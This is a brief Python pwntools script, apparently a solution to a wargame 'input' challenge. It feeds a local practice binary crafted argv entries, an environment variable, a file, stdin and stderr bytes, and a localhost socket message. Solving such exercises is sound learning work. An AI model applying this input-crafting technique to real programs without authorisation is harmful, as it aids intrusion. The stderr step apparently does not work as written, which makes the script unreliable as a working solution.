from pwn import *
import sys
import socket
import time

argv = ['\0'] * 100
argv[0] = "/home/input2/input"


argv[0x41] = "\x00"
argv[0x42] = "\x20\x0a\x0d"
argv[0x43] = "9766"
env = {"\xde\xad\xbe\xef" : "\xca\xfe\xba\xbe"}

with open("\x0a", "w") as f:
    f.write("\x00\x00\x00\x00")

sh = process(argv, env=env)
sh.send("\x00\x0a\x00\xff")
sh.stderr.write("\x00\x0a\x02\xff")

sh.recv()
time.sleep(5)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('localhost', 9766))
sock.sendall("\xde\xad\xbe\xef")


sh.interactive()